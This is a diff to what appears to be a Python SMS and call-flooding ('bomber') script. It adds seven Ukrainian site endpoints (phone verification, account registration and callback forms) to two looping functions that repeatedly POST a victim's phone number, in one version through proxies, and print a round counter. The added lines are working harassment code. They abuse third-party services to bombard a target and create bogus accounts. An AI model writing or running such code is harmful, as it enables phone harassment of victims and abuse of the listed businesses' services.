@@ -198,6 +198,13 @@ def send_for_number_https(aa):
         d = requests.post('https://api.likari.in.ua/v2/auth/sms',headers=headers,proxies=proxies, json={'phone': f'{aa[2:5]}{aa[5:8]}{aa[8:10]}{aa[10:12]}'})    
         d = requests.post('https://auth.easypay.ua/api/check',headers=headers,proxies=proxies, json={"phone": aa})    
         d = requests.post('https://izi.ua/api/auth/user-by-phone',headers=headers,proxies=proxies, json={'phone': aa})
+        d = requests.post('https://tea.ua/api/web/auth/verifyPhone',headers=headers,proxies=proxies, json={'phone': f'{aa[2:5]}{aa[5:8]}{aa[8:10]}{aa[10:12]}', 'phoneCode': "+38"})
+        d = requests.post('https://smaki-maki.com/wp-admin/admin-ajax.php',headers=headers,proxies=proxies,data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','birthday': '15.01.1998','password': password,'password2': password,'code': '','action': 'register_user'})
+        d = requests.post('https://yaskravaklumba.com.ua/index.php?route=common/header/addiwishcall',headers=headers,proxies=proxies,data={'name': name,'phone': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}','text': ''})
+        d = requests.post('https://kombinat.kiev.ua/wp-admin/admin-ajax.php',headers=headers,proxies=proxies,data={'action': 'do_something','name': 'name','phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}{aa[10:12]}','subject': ''})
+        d = requests.post('https://piromarket.com.ua/index.php?dispatch=place_order.call_you_back&comment=',headers=headers,proxies=proxies,data={'name': name,'tel':  aa})
+        d = requests.post('https://ilounge.ua/ajax/send-message-to-telegram.php',headers=headers,proxies=proxies,data={'callmeback-name': name,'callmeback-phone': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
+        d = requests.post('https://elektro.in.ua/callme.php',headers=headers,proxies=proxies,data={'phone': f'+{aa[:2]}({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
         coun+=1
         print(f'Круг {coun}')
     except:
@@ -309,6 +316,13 @@ def send_for_number(aa):
         d = requests.post('https://api.likari.in.ua/v2/auth/sms',headers=headers, json={'phone': f'{aa[2:5]}{aa[5:8]}{aa[8:10]}{aa[10:12]}'})    
         d = requests.post('https://auth.easypay.ua/api/check',headers=headers, json={"phone": aa})    
         d = requests.post('https://izi.ua/api/auth/user-by-phone',headers=headers, json={'phone': aa})
+        d = requests.post('https://tea.ua/api/web/auth/verifyPhone',headers=headers, json={'phone': f'{aa[2:5]}{aa[5:8]}{aa[8:10]}{aa[10:12]}', 'phoneCode': "+38"})
+        d = requests.post('https://smaki-maki.com/wp-admin/admin-ajax.php',headers=headers,data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','birthday': '15.01.1998','password': password,'password2': password,'code': '','action': 'register_user'})
+        d = requests.post('https://yaskravaklumba.com.ua/index.php?route=common/header/addiwishcall',headers=headers,data={'name': name,'phone': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}','text': ''})
+        d = requests.post('https://kombinat.kiev.ua/wp-admin/admin-ajax.php',headers=headers,data={'action': 'do_something','name': 'name','phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}{aa[10:12]}','subject': ''})
+        d = requests.post('https://piromarket.com.ua/index.php?dispatch=place_order.call_you_back&comment=',headers=headers,data={'name': name,'tel':  aa})
+        d = requests.post('https://ilounge.ua/ajax/send-message-to-telegram.php',headers=headers,data={'callmeback-name': name,'callmeback-phone': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
+        d = requests.post('https://elektro.in.ua/callme.php',headers=headers,data={'phone': f'+{aa[:2]}({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
         coun+=1
         print(f'Круг {coun}')
     except:
